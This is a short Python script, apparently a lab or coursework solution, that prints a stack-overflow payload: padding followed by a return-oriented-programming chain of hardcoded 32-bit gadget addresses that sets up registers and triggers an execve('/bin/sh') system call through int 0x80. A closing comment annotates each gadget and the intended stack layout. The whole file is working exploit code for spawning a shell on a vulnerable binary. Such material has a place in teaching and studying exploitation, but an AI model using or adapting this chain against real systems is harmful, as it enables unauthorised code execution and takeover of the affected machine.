from __future__ import print_function
from shellcode import shellcode
from struct import pack
zero_word = 0xbffeaa9c
bin_str = 0xbffeaaa0
print("A" * 23 + "A" * 89  + pack("<I", 0x0807ed1b) + pack("<I", 0x08057360) + pack("<I", zero_word) + pack("<I", 0x01010101) + pack("<I", bin_str) + pack("<I", 0x0808e97d) + pack("<I", 0x080c2355) + pack("<I", 0x0101010c) + pack("<I", 0x08074708) + pack("<I", 0x08057360) + pack("<I", zero_word) + pack("<I", zero_word + 8) + pack("<I", bin_str) + pack("<I", 0x080e1fa5) + pack("<I", 0x080494f9) + pack("<I", bin_str) + pack("<I", 0xAAAAAAAA) + "/bin/sh\0", end='')

'''
pack("<I", 0x2f62696e) + pack("<I", 0x2f736800)
080ac170	- mov eax, ecx ; ret
stack looks like this

/sh\0
/bin		- /bin/sh stored here
{zero word}	- second arg zero
ptr to /bin
080494f9	-int 0x80
0x080e1fa5	- mov (edx), ecx ; ret
/bin addr
ZERO Word + 8
Zero Word
0x08057360	- pop edx ; pop ecx ; pop ebx ; ret
08074708	- sub eax, ecx ; ret
0101010c
080c2355	- inc eax ; pop eax ; ret
0x0808e97d	- mov eax, (edx) ; ret
PTR to /bin
0x01010101	- will subtract off later
ADDR of Zero Word
0x08057360	- pop edx ; pop ecx ; pop ebx ; ret
0x0807ed1b	- xor eax, eax ; ret

/bin @ 0xbffeaa9c
zero word @0xbffeaa98
'''

